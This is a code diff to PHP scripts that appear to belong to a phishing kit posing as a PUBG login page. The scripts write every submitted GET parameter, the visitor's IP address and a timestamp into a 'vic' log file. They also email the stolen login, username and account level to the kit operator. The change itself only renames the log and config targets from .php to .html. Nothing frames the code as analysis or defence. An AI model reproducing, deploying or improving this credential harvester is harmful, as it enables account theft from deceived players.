@@ -1,9 +1,9 @@
 <?php
-include ('../../admin/config.php');
+include ('../../admin/config.html');
 $headers = "From: mr.kanhan@gmail.com";
 $headers.= "Content-type: text/html";
 $success = mail($mailto, $subjek, $body, $headers);
-$handle = fopen("../../admin/vic.php", "a");
+$handle = fopen("../../admin/vic.html", "a");
 foreach ($_GET as $variable => $value) {
     fwrite($handle, $variable);
     fwrite($handle, "=");
@@ -13,7 +13,7 @@ foreach ($_GET as $variable => $value) {
 fwrite($handle, "");
 fclose($handle);
 $bilsmg.= "</center> <center><br>";
-$file = fopen("../../admin/vic.php", "a");
+$file = fopen("../../admin/vic.html", "a");
 fwrite($file, $bilsmg);
 fclose($file);
 $line = date('Y-m-d H:i:s') . " - $_SERVER[REMOTE_ADDR]";
@@ -36,7 +36,7 @@ $country = $_GET['country'];
 ?>
 
 <?php
-include ('../../admin/config.php');
+include ('../../admin/config.html');
 $url = "http://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
 $subjek = "PUBG $login|$username|$level";
 $body = <<<EOD
